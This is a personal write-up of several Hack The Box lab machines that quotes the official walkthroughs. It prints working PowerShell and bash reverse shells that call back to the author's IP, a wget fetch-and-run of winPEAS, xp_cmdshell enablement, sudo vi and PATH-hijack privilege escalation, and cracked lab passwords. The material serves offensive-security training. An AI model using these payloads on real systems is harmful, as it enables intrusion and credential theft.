# Miscellaneous 3

## Smbclient, MSSQL xp_cmdshell (mssqlclient), WinPEAS

From the official HTB write-up: *Starting with (...) which is a Windows machine, you can have a chance to exploit a misconfiguration in Microsoft SQL Server, try getting a reverse shell and get familiarized with the use of Impacket tool in order to further attack some services.*

*We found that SMB ports are open and also that a Microsoft SQL Server 2017 is running on port 1433. We
are going to enumerate the SMB with the tool smbclient:*

```
smbclient -N -L \\\\{TARGET_IP}\\
```

- ```-N```: No password
- ```-L```: This option allows you to look at what services are available on a server

*We located a couple of interesting shares. Shares ```ADMIN$``` & ```C$``` cannot be accessed as the Access Denied error states, however, we can try to access and enumerate the backups share by using the following command:*

```
smbclient -N \\\\{TARGET_IP}\\backups
```

*There is a file named ```prod.dtsConfig``` which seems like a configuration file. We can download it to our local machine by using the ```get``` command for further offline inspection. With the provided cleartext credentials we just need a way to connect and authenticate to the MSSQL server. Impacket tool includes a valuable python script called mssqlclient.py which offers such functionality.*

*After understanding the options provided, we can try to connect to the MSSQL server (using the password we spotted previously in the configuration file) by issuing the following command:*

```
impacket-mssqlclient ARCHETYPE/sql_svc@10.129.214.90 -windows-auth
```

- ```-windows-auth```: this flag is specified to use Windows Authentication

*Here's two great articles that can guide us further to our exploration journey with MSSQL Server:*

- [Pentesting MSSQL - Microsoft SQL Server](https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server)

- [MSSQL Injection Cheat Sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)

*As a first step we need to check what is the role we have in the server. We will use the command found in the above cheatsheet:*

```
SELECT is_srvrolemember('sysadmin');
```

*The output is 1 , which translates to True. In previous cheatsheets, we found also how to set up the command execution through the ```xp_cmdshell. First it is suggested to check if the ```xp_cmdshell``` is already activated by issuing the first command:```*

```
EXEC xp_cmdshell 'net user';
```

*Indeed is not activated. For this reason we will need to proceed with the activation of ```xp_cmdshell``` as follows:*

```
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
sp_configure;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

Note: To enable ```xp_cmdshell``` on SQL Server, we first need to allow advanced options by running ```EXEC sp_configure 'show advanced options', 1;```. After that, execute ```RECONFIGURE;``` to apply the changes. Then, run ```sp_configure;``` to verify the available options. Finally, enable ```xp_cmdshell``` by running ```EXEC sp_configure 'xp_cmdshell', 1;``` and apply this change with another ```RECONFIGURE;```. This sequence allows us to execute commands through SQL Server using xp_cmdshell.

*Now we are able to execute system commands:*

```
xp_cmdshell "whoami"
```

Note: to quickly check the current working directory, we can issue the following command:

```
xp_cmdshell "powershell -c pwd"
```

The the write-up continues: *now, we will attempt to get a stable reverse shell. We will upload the nc64.exe binary to the target machine and execute an interactive cmd.exe process on our listening port.*

Note: The nc64.exe binary is a standalone 64-bit version of Netcat, which is a versatile networking utility used for reading from and writing to network connections using TCP or UDP. It's particularly handy for establishing reverse shells.

However, I’m always against touching the disk unless there's no other alternative. For this reason, I opted for a stealthier method by deploying a PowerShell payload capable of establishing a reverse shell with my ncat listener.

A great resource for generating payloads is [RevShells](https://www.revshells.com/). I selected the following shell type: Reverse > Windows > PowerShell#3 (base64).

But first, here’s the cleartext payload (without base64 encoding) for quick reference:

```
powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('10.10.14.210', 8000);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"
```

Setting up my listener looks like this:

```
ncat -lvnp 8000
```

Executing this payload is done like this:

```
xp_cmdshell powershell -e JABjA(...)
```

After that, I got the reverse shell and grabbed the user flag located in the user's Desktop (```C:\Users\sql_svc\Desktop```). Next on the agenda is privilege escalation.

And now I am going back to the official write-up: *for privilege escalation, we are going to use a tool called ```winPEAS```, which can automate a big part of the enumeration process in the target system. We will transfer it to our target system by using once more the Python HTTP server:*

```
python3 -m http.server 8080
```

Note: it's crucial to start this server from a directory where winPEAS binary is located.

*On the target machine, we will execute the wget command in order to download the program from our
system. The file will be downloaded in the directory from which the wget command was run. We will use
powershell for all our commands:*

```
powershell wget http://10.10.14.210:8080/winPEASx64.exe -outfile winPEASx64.exe
```

*We successfully downloaded the binary. To execute it, we will do the following:*

```
PS C:\Users\sql_svc\Downloads> .\winPEASx64.exe
```

*From the output we can observe that we have ```SeImpersonatePrivilege```, which is also vulnerable to juicy potato exploit. However, we can first check the two existing files where credentials could be possible to be found.*

*As this is a normal user account as well as a service account, it is worth checking for frequently access files or executed commands. To do that, we will read the PowerShell history file, which is the equivalent of .bash_history for Linux systems. The file ConsoleHost_history.txt can be located in the directory ```C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\```.*

Note: The output from winPEAS is extensive, and the official write-up included a sample that differed significantly from what I saw on my machine, which led to some confusion. After some searching, I finally found what I needed, and here's how the relevant output looked on my machine:

```
PowerShell v2 Version: 2.0
    PowerShell v5 Version: 5.1.17763.1
    PowerShell Core Version: 
    Transcription Settings: 
    Module Logging Settings: 
    Scriptblock Logging Settings: 
    PS history file: C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    PS history size: 79B
```

*We can navigate to the folder where the PowerShell history is stored. To read the file, we will issue ```type ConsoleHost_history.txt``` We got in cleartext the password for the Administrator user. We can now use the tool psexec.py again from the Impacket suite to get a shell as the administrator.*

Note: I prefer using wmiexec.

```
impacket-wmiexec administrator@10.129.214.90
```

*The root flag can now be found on the Desktop of the Administrator user.*

This example is now concluded.

## Cookie Manipulation, Arbitrary File Upload, PHP Reverse Shell, SUID Exploitation, Path Hijacking

From the official HTB write-up: *Whenever you are performing a web assessment that includes authentication mechanisms, it's always advised to check cookies, sessions and try to figure out how access control really works. In many cases, a Remote Code Execution attack and a foothold on system might not be achievable by itself, but rather after chaining different types of vulnerabilties and exploits. In this box, we are going to learn that Information Disclosure and Broken Access Control types of vulnerabilties even though they seem not very important can have a great impact while attacking a system, and thus why even small vulnerabilities matter.*

*After the initial enumeration we can spot port 22 (SSH) and port 80 (HTTP) as open. We visit the IP using the web browser where we face a website for automotive.*

*According to everything we have seen so far, the website should have a login page. Before we proceed with directory and page enumeration, we can try to map website by using Burp Suite proxy to passively spider the website.*

*After ensuring our FoxyProxy settings are correct and launching Burp Suite, we need to disable the interception in Burp Suite as it's enabled by default. Navigate to ```Proxy Tab```, and under ```Intercept``` subtab select the button where ```Intercept is on``` to disable it.*

*Now that everything is setup correctly we refresh the page in our browser and switch in Burp Suite under the Target tab and then on the Sitemap option. It is possible to spot some directories and files that weren't visible while browsing. One that is indeed very interesting it's the directory of ```/cdn-cgi/login```.*

*We can visit it in our browser and indeed we are presented with the login page. After trying a couple of default username/password combinations, we didn't managed to get any access. But there is also an option to Login as Guest. Trying that and now we are presented with couple of new navigation options. After navigating through the available pages, we spot that the only interesting one seems to be the ```Uploads```. However it is not possible to access it as we need to have super admin rights.*

*We need to find a way to escalate our privileges from user Guest to super admin role. One way to try this is by checking if cookies and sessions can be manipulated. It is possible to view and change cookies in Mozilla Firefox through the usage of Developer Tools. In order to enter the Developer Tools panel we need to right click in the content of the webpage and select the ```Inspect Element(Q)```.*

*Then we can navigate to ```Storage``` section where Cookies are being presented. As one can observe, there is a ```role=guest``` and ```user=2233``` which we can assume that if we somehow knew the number of super admin for the user variable, we might be able to gain access to the upload page.*

*We check the URL on our browsers bar again where there is an id for every user:*

```
http://10.129.95.191/cdn-cgi/login/admin.php?content=accounts&id=2
```

*We can try change the ```id``` variable to something else like for example ```1``` to see if we can enumerate the users. Indeed we got an ```information disclosure vulnerability``` (the screenshot is omitted here to save space), which we might be able to abuse. We now know the access ID of the ```admin``` user thus we can try to change the values in our cookie through the Developer tools so the ```user``` value to be ```34322``` and ```role``` value to be ```admin```. Then we can revisit the ```Uploads``` page. We finally got access to the upload form!*

*Now that we got access to the upload form we can attempt to upload a ```PHP reverse shell```. Instead of creating our own one, we will use an existing one. It is possible to find webshells under the folder ```/usr/share/webshells/``` (my Kali machine has them too by default). For this exercise we are going to use the ```/usr/share/webshells/php/php-reverse-shell.php```.*

*Of course, we are going to change the ```$ip``` and the ```$port``` variables to match our settings and then we will attempt to upload the file.*

*We finally managed to upload it. Now we might need to bruteforce directories in order to locate the folder where the uploaded files are stored but we can also guess it. ```uploads``` directory seems a logical assumption. We confirm that by running also the ```gobuster``` tool.*

```
gobuster dir --url http://{TARGET_IP}/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php
```

*The gobuster immediately found the ```/uploads``` directory. We don't have permission to access the directory but we can try directly access our uploaded file. But first, we will need to set up a netcat connection (or ncat in my case):*

```
ncat -lvnp 8000
```

Then request our shell through the browser:

```
http://{TARGET_IP}/uploads/php-reverse-shell.php
```

*We got a reverse shell! In order to have a functional (interactive) shell though we can issue the following:*

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

*As user ```www-data``` we can't achieve many things as the role has restricted access on the system. Since the website is making use of PHP and SQL we can enumerate further the web directory for potential disclosures or misconfigurations. After some search we can find some interesting php files under ```/var/www/html/cdn- cgi/login directory```.*

*We can manually review the source code of all the pages or we can try search for interesting strings with the usage of grep tool. We can use ```cat *``` to read all files while pipeing the output to grep where we provide the pattern of a string that starts with the word passw and followed by any string such as for example words ```passwd``` or ```password```. We can also use the switch ```-i``` to ignore case sensitive words like ```Password```.*

```
cat * | grep -i passw*
```

*We indeed got the password: ```MEGACORP_4dm1n!!```. We can check the available users are on the system by reading the ```/etc/passwd``` file so we can try a password reuse of this password.*

```
cat /etc/passwd
```

*We found user robert. In order to login as this user, we use the su command: ```su robert```.*

*Unfortunately, that wasn't the password for user ```robert```. Let's read one by one the files now. We are going to start with db.php which seems interesting. Now that we got the password we can successfully login and read the user.txt flag which can be found in the home directory of ```robert```*

*Before running any privilege escalation or enumeration script, let's check the basic commands for elevating privileges like ```sudo``` (or ```sudo -l```) and ```id```.*

*We observe that user ```robert``` is part of the group ```bugtracker```. Let's try to see if there is any binary within that group:*

```
find / -group bugtracker 2>/dev/null
```

*We found a file named ```bugtracker```. We check what privileges and what type of file is it:

```
ls -la /usr/bin/bugtracker && file /usr/bin/bugtracker
```

*There is a suid set on that binary, which is a promising exploitation path.*

**Commonly noted as SUID (Set owner User ID), the special permission for the user access level has a single function: A file with SUID always executes as the user who owns the file, regardless of the user passing the command. If the file owner doesn't have execute permissions, then use an uppercase S here. In our case, the binary 'bugtracker' is owned by root & we can execute it as root since it has SUID set.**

*We will run the application (issuing ```bugtracker```) to observe how it behaves.*

**The tool is accepting user input as a name of the file that will be read using the ```cat``` command, however, it does not specifies the whole path to file ```cat``` and thus we might be able to exploit this.**

*We will navigate to /tmp directory and create a file named cat with the following content: ```/bin/sh```*

```
echo '/bin/sh' > cat
```

*We will then set the execute privileges:*

```
chmod +x cat
```

*In order to exploit this we can add the /tmp directory to the PATH environmental variable.*

**PATH is an environment variable on Unix-like operating systems, DOS, OS/2, and Microsoft Windows, specifying a set of directories where executable programs are located.**

*We can do that my issuing the following command:*

```
export PATH=/tmp:$PATH
```

*Now we will check the ```$PATH```:*

```
echo $PATH
```

*Finally execute the bugtracker from ```/tmp``` directory. The root flag can be found in the ```/root``` folder.*

Note: I've had some difficulties reading the root flag as earlier adding ```/tmp``` to my ```PATH``` might have caused the shell to prioritize my ```cat file``` over the system's ```cat``` command. A quick and simple workaround for this is the following well-known command:

```
tail -n 10 root.txt
```

This example is now concluded.

## Password cracking with John and Hashcat, unstable SQLmap OS shell, SUDO Exploitation

From the official HTB write-up: *There are three ports open: 21 (FTP), 22 (SSH), 80 (HTTP). Since we don't have any credentials for the SSH service, we will start off with enumeration of the port 21, since the Nmap shows that it allows anonymous login.*

*We can see that there is a backup.zip file available, we will download it. It will be located in the folder from where we established the FTP connection. We will try to unzip it with the command ```unzip backup.zip```.*

*The compressed archive asks us for a password. We will try a couple of basic passwords to see if it will let us in, however, no luck in it. We will have to somehow crack the password. The tool we will use for this task is named John the Ripper.*

*In order to successfully crack the password, we will have to convert the ZIP into the hash using the ```zip2john``` module that comes within John the Ripper:*

```
zip2john backup.zip > hashes
```

*Now, we will type the following command that will load the wordlist & it will do a bruteforce attack against the hash stored in file ```hashes```:*

```
john -wordlist=/usr/share/wordlists/rockyou.txt hashes
```

*Once the password is cracked, we will use the --show option to display the cracked password.*

```
john --show hashes
```

*We can see the cracked password and we will extract the files now. We will now read the index.php file first. We can see the credentials of ```admin:2cb42f8734ea607eefed3b70af13bbd3```, which we might be able to use. However, the password seems hashed.*

*Next, we will try to identify the hash type & crack it with the hashcat:*

```
hashid 2cb42f8734ea607eefed3b70af13bbd3
```

*It provides a huge list of possible hashes, however, we will go with MD5 first. We will put the hash in a text file called hash & then crack it with hashcat:*

```
echo '2cb42f8734ea607eefed3b70af13bbd3' > hash
hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt
```

Note: ```-a 0```option specifies the attack mode. ```-a 0``` means we're using a "straight" attack, where we simply hash each word from the provided wordlist and compare it to the hash we're trying to crack. ```-m 0``` option specifies the hash type. ```-m 0``` is for MD5 hashes. Hashcat supports many different hash types, so we would change this depending on the hash we're working with (e.g., ```-m 1000``` for NTLM, ```-m 1800``` for sha512crypt). Overall, running ```hashcat --help``` will provide us with a comprehensive list of all the options, flags, and hash types we can use with Hashcat.

*Hashcat cracked the password: ```qwerty789``` We will start our web browser to enumerate the port 80, see where can we log in. We can see the login page, by supplying the previously found username & cracked password, we managed to log in successfully.*

*So the dashboard has nothing special in it, however, it has a catalogue, which might be connected with the database. Let's create any query. By checking the URL, we can see that there is a variable ```$search``` which is responsible for searching through catalogue. We could test it to see if it's SQL injectable, but instead of doing it manually, we will use a tool called ```sqlmap```.*

*We will provide the URL & the cookie to the sqlmap in order for it to find vulnerability. The reason why we have to provide a cookie is because of authentication. To grab the cookie, we can intercept any request in Burp Suite & get it from there, however, you can install a great extension for your web browser called ```cookie-editor```.*

*The cookies in HTTP messages of requests are usually set the following way: ```PHPSESSID=7p3jd9cb20tbr7qcf1tac5btef```*

*Knowing that, here's how our sqlmap syntax should look:*

```
sqlmap -u 'http://10.129.95.174/dashboard.php?search=test' --cookie="PHPSESSID=7p3jd9cb20tbr7qcf1tac5btef"
```

Note: values presented in the command above are taken from my Kali machine as I was walking through this example. Also, using double quotes everywhere is fine for consistency, especially in environments like Windows where single quotes may not behave as expected. On Linux, both single and double quotes generally work, but they have different behaviors. Single quotes preserve the literal value of each character within the quotes, meaning variables or special characters won't be interpreted. Double quotes allow for variable expansion and interpretation of special characters.

Next, the official write-up didn't perform a very good job on emphasizing the relevant output we are looking for, so I will include it here:

```
(...)

[*] starting @ 16:15:04 /2024-09-09/

(...)

[16:15:20] [INFO] GET parameter 'search' appears to be 'PostgreSQL > 8.1 stacked queries (comment)' injectable 
[16:15:20] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[16:15:30] [INFO] GET parameter 'search' appears to be 'PostgreSQL > 8.1 AND time-based blind' injectable 
[16:15:30] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
GET parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 

(...)
```

The important part is the very last line presented here saying: ```GET parameter 'search' is vulnerable.```

And now back to the official write-up: *The tool confirmed that the target is vulnerable to SQL injection, which is everything we needed to know. We will run the sqlmap once more, where we are going to provide the ```--os-shell flag```, where we will be able to perform command injection:*

```
sqlmap -u 'http://10.129.95.174/dashboard.php?search=test' --cookie="PHPSESSID=7p3jd9cb20tbr7qcf1tac5btef"  --os-shell
```

Here's some of the output from my Kali machine again:

```
(...)

[16:32:35] [INFO] fingerprinting the back-end DBMS operating system
[16:32:37] [INFO] the back-end DBMS operating system is Linux
[16:32:37] [INFO] testing if current user is DBA
[16:32:38] [INFO] retrieved: '1'
[16:32:38] [INFO] going to use 'COPY ... FROM PROGRAM ...' command execution
[16:32:38] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER
os-shell>
```

*We got the shell, however, it is not very stable & interactive. To make it much stable, we will use the following payload:*

```
bash -c "bash -i >& /dev/tcp/10.10.14.235/443 0>&1"
```

*But first, We will turn on the netcat (or ncat, in my case) listener on port 443:*

```
ncat -lvnp 443
```

*Then we will execute the payload mentioned above and check our listener:*

```
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.129.95.174:43380.
bash: cannot set terminal process group (3364): Inappropriate ioctl for device
bash: no job control in this shell
postgres@vaccine:/var/lib/postgresql/11/main$ whoami
whoami
postgres
postgres@vaccine:/var/lib/postgresql/11/main$ 
```

*We got the foothold. We will quickly make our shell fully interactive:*

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL+Z
stty raw -echo; fg
export TERM=xterm
```

Here's a quick rundown of the commands:

- ```python3 -c 'import pty;pty.spawn("/bin/bash")'```: This command spawns a fully interactive TTY shell using Python, making the shell behave more like a local terminal with features like command history and job control.

- ```CTRL+Z```: This keyboard shortcut suspends the current process (the shell) and brings you back to your local terminal.

- ```stty raw -echo; fg```: The ```stty raw -echo``` command changes the terminal settings to pass input directly to the shell without echoing it back, making the remote shell more responsive. ```fg``` resumes the suspended process (your shell) in the foreground.

- ```export TERM=xterm```: This sets the terminal type to ```xterm```, which helps certain terminal features work correctly, such as text formatting and arrow keys.

Note: Unfortunately, the shell proved to be extremely unstable, often crashing every 1-2 minutes. As a result, I had to re-launch the exploit multiple times to quickly enumerate and explore the target machine. Also, sending a newline manually by typing Ctrl+J instead of pressing Enter has helped me to execute the ```export TERM=xterm``` command properly on some instances.

Anyway, let's go back to the official write-up: *We got the fully interactive shell now. The user flag could be found in ```/var/lib/postgresql/```.

Note: I am using the following command for convenience when looking for flags:

```
find / -name user.txt 2>/dev/null
```

*As for the privilege escalation, we are user "postgres", but we don't know the password for it, which means we cannot check our sudo privileges using the ```sudo -l``` command. We will try to find the password in the /var/www/html folder, since the machine uses both PHP & SQL, meaning that there should be credentials in clear text. In the dashboard.php, we found the following line revealing credentials we need:*

```
$conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
```

*Because the shell is very unstable, we will use the SSH to log in:* ```ssh postgres@10.129.95.174```

*We will type the ```sudo -l``` to see what privileges do we have:*

```
(...)

User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

*So we have sudo privileges to edit the pg_hba.conf file using vi by running ```sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf```. We will go to [GTFOBins](https://gtfobins.github.io/gtfobins/vi/#sudo) to see if we can abuse this privilege.*

**If the binary is allowed to run as superuser by sudo, it does not drop the elevated
privileges and may be used to access the file system, escalate or maintain privileged
access.**

**sudo vi -c ':!/bin/sh' /dev/null**

```
Sorry, user postgres is not allowed to execute '/bin/vi /etc/postgresql/11/main/pg_hba.conf -c :!/bin/sh' as root on vaccine.
postgres@vaccine:~$ /dev/null
-bash: /dev/null: Permission denied
```

*We are unable to execute the following command because sudo is restricted to only ```/bin/vi /etc/postgresql/11/main/pg_hba.conf```. There's also an alternative way according to GTFOBins:*

```
vi
:set shell=/bin/sh
:shell
```

*So we will perform that as well:*

```
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

*Now we will press the ```:``` button to set the instructions inside ```Vi```:*

```
:set shell=/bin/sh
:shell
```

Note: to exit vi (or vim) without saving changes (in case of accidental keystrokes), press Esc to ensure you're in command mode. Then type ```:q!``` and press Enter.

*After we execute the instructions, we will see the following:*

```
postgres@vaccine:~$ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf

# whoami
root
```

Note: type ```bash``` to switch to ```/bin/bash shell```.

Finally, I was able to find and grab the root flag:

```
find / -name root.txt 2>/dev/null
```

This example is now concluded.

## Local File Inclusion, LXC container privilege escalation

From the official HTB write-up: *We begin, as always, by scanning the target for open ports. The scan shows only port 80 TCP open, which seems to be running Apache version 2.4.29. Let's navigate to port 80 using a browser like Chromium.*

*The webpage features the landing page for a Gear manufacturing company. It does not seem to contain anything of interest, however, if we take a look at the URL we can see that this has automatically changed to ```http://{target_IP}/?file=home.php```. This is a common way that developers use to dynamically load pages in a website and if not programmed correctly it can often lead to the webpage being vulnerable to Local File Inclusion, but more about that in a bit.*

*First, let's take a look at how this functionality might work.*

```
if ($_GET['file']) {
    include($_GET['file']);
} else {
    header("Location: http://" . $_SERVER['HTTP_HOST'] . "/index.php?file=home.php");
}
```

*In the above example, the code is located inside ```index.php```, which is used to dynamically load other pages of the website by using the file variable as the control point. If this variable has not been specified in the GET request, the page automatically re-writes the URL and loads ```home.php```. If the value has been specified, the code attempts to load a page from the value of the variable.*

*For instance, if the variable was ```file=register.php```, the PHP code would attempt to load ```register.php``` from the same folder.*

*This is a good way to seamlessly load different web pages, however if the ```include``` command is not restricted to just the web directory (e.g. ```/var/www/html```), it might be possible to abuse it in order to read any file that is available on the system and the user who is running the web server has privileges to read.*

*This is what is called a Local File Inclusion vulnerability and is defined as follows:*

**Local file inclusion (also known as LFI) is the process of including files, that are already locally present on the server, through the exploitation of vulnerable inclusion procedures implemented in an application.**

*We can easily determine if this is the case by attempting to load a file that we know definitely exists on the system and is readable by all users. One of those files is ```/etc/passwd``` and to load it, change the ```file``` parameter from ```home.php``` to ```/etc/passwd```. For consistency reasons we will show this process with the cURL command line utility instead of a browser.*

```
curl 'http://10.129.95.185/?file=/etc/passwd'
```

The output looks like this:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
mike:x:1000:1000:mike:/home/mike:/bin/bash
tftp:x:110:113:tftp daemon,,,:/var/lib/tftpboot:/usr/sbin/nologin
```

Note: ``` /etc/passwd``` is a file that lists all users on a Unix/Linux system. Each line represents a user and contains several fields separated by colons (```:```). The structure looks like this:

```
username:x:UID:GID:comment:home_directory:shell
```

*This is successful and a list of users is returned.*

*It is worth noting that inputting /etc/passwd might not always work if the inclusion already specifies a working directory. For instance, consider the following code.*

```
if (isset($_GET['file'])) {
    include(__DIR__ . '/' . $_GET['file']);
} else {
    header("Location: http://" . $_SERVER['HTTP_HOST'] . "/index.php?file=home.php");
}
```

*In this example the ```__DIR__``` parameter is used to acquire the current working directory that the script is located in (e.g. ```/var/www/html```) and then the value of the ```file``` variable is concatenated at the end. If we were to input ```/etc/passwd``` the full path would become ```/var/www/html/etc/passwd```, which would result in a blank page as there is no such file or folder on the system.*

*To bypass this restriction we would have to instruct the code to search in previous directories. This would work similarly to how navigating to a previous folder is done with the ```cd``` command.*

*In such a case (presented in the write-up), ```/etc/passwd``` would become ```../../../etc/passwd```.*

*Back to the task at hand, while a Local File Inclusion is a great way to gather information and read system files the goal of every Penetration Tester is to achieve Remote Code Execution on a system. There is a plethora of ways that an LFI can turn into RCE, from log poisoning to plaintext passwords in configuration files and forgotten backups, however in this case the ```passwd``` file gave us a big hint as to how to proceed. The last user that is listed is called tftp.*

```
tftp:x:110:113:tftp daemon,,,:/var/lib/tftpboot:/usr/sbin/nologin
```

*The nmap scan reveals that port 69 UDP is open and an instance of the TFTP server is running on it. In order to communicate with TFTP, we need to install it on our Linux machine.*

Note: my Kali machine has it by default.

*TFTP works by default without the need for authentication. That means that anyone can connect to the TFTP server and upload or download files from the remote system.*

*We can chain this with the LFI vulnerability that we have already identified, in order to upload malicious PHP code to the target system that will be responsible for returning a reverse shell to us. We will then access this PHP file through the LFI and the web server will execute the PHP code.*

*We can either create our own PHP code or use one of the many available PHP reverse shells that can be found online through a Google search.*

Note: on Kali Linux, the PHP web shells are typically located in the following directory: ```/usr/share/webshells/php/```

*After editing the PHP shell and saving it, we are ready to upload the file to the remote TFTP server.*

```
tftp 10.129.95.185
tftp> put shell.php
```

*Now that the file has been uploaded, we need to start a local Netcat (or ncat) listener on the port that we specified in the reverse shell, in order to catch the connection once it initiates.*

```
ncat -lvp 4444
```

*With this information let's try to load ```/var/lib/tftpboot/shell.php```.*

```
curl 'http://10.129.95.185/?file=/var/lib/tftpboot/shell.php'
```

*Once this command is run our terminal will appear stuck, however our Netcat listener has caught a connection. The received shell is not fully interactive, however we can make it a bit better by using Python3.*

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Here is the output from my Kali machine:

```
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.129.95.185:36604.
Linux included 4.15.0-151-generic #157-Ubuntu SMP Fri Jul 9 23:07:57 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 14:41:35 up 50 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@included:/$ ls
ls
bin    dev   initrd.img      lib64       mnt   root  snap  tmp  vmlinuz
boot   etc   initrd.img.old  lost+found  opt   run   srv   usr  vmlinuz.old
cdrom  home  lib             media       proc  sbin  sys   var
www-data@included:/$
```

*With access to the system as the ```www-data``` user we do not have enough privileges to read the user flag, therefore we need to find a way to move laterally to user ```mike``` who was also found on the ```passwd``` file. A good place to start our enumeration would be the web server directory as it often contains configuration files that might include passwords.*

*The web-related files are usually stored in the ```/var/www/html``` folder, so that's where we are going start.*

Here is the example from my Kali machine:

```
www-data@included:/var/www/html$ ls -la
ls -la
total 88
drwxr-xr-x 4 root     root      4096 Oct 13  2021 .
drwxr-xr-x 3 root     root      4096 Apr 23  2021 ..
-rw-r--r-- 1 www-data www-data   212 Apr 23  2021 .htaccess
-rw-r--r-- 1 www-data www-data    17 Apr 23  2021 .htpasswd
-rw-r--r-- 1 www-data www-data 13828 Apr 29  2014 default.css
drwxr-xr-x 2 www-data www-data  4096 Apr 23  2021 fonts
-rw-r--r-- 1 www-data www-data 20448 Apr 29  2014 fonts.css
-rw-r--r-- 1 www-data www-data  3704 Oct 13  2021 home.php
drwxr-xr-x 2 www-data www-data  4096 Apr 23  2021 images
-rw-r--r-- 1 www-data www-data   145 Oct 13  2021 index.php
-rw-r--r-- 1 www-data www-data 17187 Apr 29  2014 license.txt
www-data@included:/var/www/html$
```

*The folder contains two interesting hidden files, ```.htaccess``` and ```.htpasswd```. The htpasswd file is used to store usernames and passwords for basic authentication of HTTP users. Let's read both files.*

```
www-data@included:/var/www/html$ cat .htaccess
cat .htaccess
RewriteEngine On
RewriteCond %{THE_REQUEST} ^GET.*index\.php [NC]
RewriteRule (.*?)index\.php/*(.*) /$1$2 [R=301,NE,L]
#<Files index.php>
#AuthType Basic
#AuthUserFile /var/www/html/.htpasswd
#Require valid-user
www-data@included:/var/www/html$ cat .htpasswd
cat .htpasswd
mike:Sheffield19
www-data@included:/var/www/html$
```

*The second file contains credentials for user Mike. Often times users re-use the same passwords for multiple services and accounts and compromising one of them might mean that all of them are compromised.*

*If user Mike has used the same password for their system account, we might be able to use the ```su``` utility to acquire a shell with their privileges.*

```
www-data@included:/var/www/html$ su mike
su mike
Password: Sheffield19

mike@included:/var/www/html$ whoami
whoami
mike
mike@included:/var/www/html$
```

*Now we are ready to grab the user flag.*

```
find / -name user.txt 2>/dev/null
```

And the output from my Kali machine looks like this:

```
mike@included:/var/www/html$ find / -name user.txt 2>/dev/null
find / -name user.txt 2>/dev/null
/home/mike/user.txt
